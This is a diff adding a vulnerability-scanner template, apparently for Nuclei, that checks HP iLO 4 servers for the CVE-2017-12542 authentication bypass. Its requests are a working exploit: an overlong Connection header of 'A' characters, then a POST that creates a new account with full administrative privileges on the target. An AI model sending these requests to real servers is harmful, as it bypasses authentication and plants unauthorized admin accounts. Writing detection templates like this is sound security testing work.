@@ -1,0 +1,73 @@
+id: hp-ilo4-auth-bypass-cve-2017-12542
+
+info:
+  name: HP iLO4 Login Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    A vulnerability in HPE Integrated Lights-Out 4 (iLO 4) servers allows for remote code execution or authentication bypass. Exploitation may lead to plaintext password extraction, unauthorized admin account creation, malicious code execution, or firmware replacement.
+  tags: login, authentication, bypass
+  classification:
+    cve-id: CVE-2017-12542
+    cvss-score: 9.8
+  reference:
+    - https://www.freebuf.com/vuls/167124.html
+
+variables:
+  random_str: "{{rand_base(8, '0123456789abcdef')}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "/rest/v1/AccountService/Accounts"
+    headers:
+      Connection: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "Oem"
+          - "ManagerAccount"
+        part: body
+
+  - id: create-account
+    method: POST
+    path:
+      - "/rest/v1/AccountService/Accounts"
+    headers:
+      Connection: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+      Content-Type: "application/json"
+    body: |
+      {
+        "UserName": "{{random_str}}",
+        "Password": "{{random_str}}",
+        "Oem": {
+          "Hp": {
+            "Privileges": {
+              "RemoteConsolePriv": true,
+              "iLOConfigPriv": true,
+              "VirtualMediaPriv": true,
+              "UserConfigPriv": true,
+              "VirtualPowerAndResetPriv": true,
+              "LoginPriv": true
+            },
+            "LoginName": "{{random_str}}"
+          }
+        }
+      }
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "MessageID"
+          - ".Created"
+        part: body
+      - type: word
+        words:
+          - "reateLimitReachedForResource"
+        part: body
